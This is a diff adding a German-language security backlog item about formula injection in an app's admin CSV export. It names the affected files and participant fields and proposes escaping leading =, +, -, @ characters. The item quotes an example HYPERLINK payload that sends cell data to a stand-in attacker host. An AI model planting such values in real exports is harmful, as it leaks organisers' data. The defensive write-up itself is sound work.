@@ -118,6 +118,17 @@ Stand beim Einführen der Regeln. Darf nur sinken; wer eine betroffene Stelle an
   - Bewusst beibehalten: Offline-Cache des Service Workers für Profildaten (schlechter Empfang auf
     dem Festival; Daten liegen nur auf dem Gerät der Person). Cache API ignoriert `no-store`.
 
+- [ ] **S10 – Formel-Injection im CSV-Export (zielt auf das Orga-Team).**
+  Der Admin-Export (`react-csv` in `frontend/src/form/adminArea/Dashboard.tsx`,
+  `frontend/src/form/adminArea/ShiftAssignments/utils/exportUtils.ts`) schreibt Eingaben der
+  Teilnehmenden ungefiltert in CSV-Dateien (Name, E-Mail, Supporter-Buddy, Equipment, Sonderwünsche).
+  Ein Wert wie `=HYPERLINK("https://evil.example?d="&B2;"Klick")` wird in Excel/LibreOffice zur Formel
+  und kann Daten aus anderen Zellen abfließen lassen.
+  Maßnahme: zentral für alle Exporte Werte mit `=`, `+`, `-`, `@`, Tab oder CR am Anfang mit `'`
+  präfixen; Test dazu.
+  (Zum Vergleich geprüft: `payment_notes` sind kein XSS-Einfallstor – nur Admins schreiben sie,
+  React rendert sie als Text, im Frontend wird nirgends rohes HTML gerendert.)
+
 ### Voraussetzung: Charakterisierungstests
 
 - [x] Testinfrastruktur (`server/test/conftest.py`): Flask-Test-Client, isolierte DB pro Test
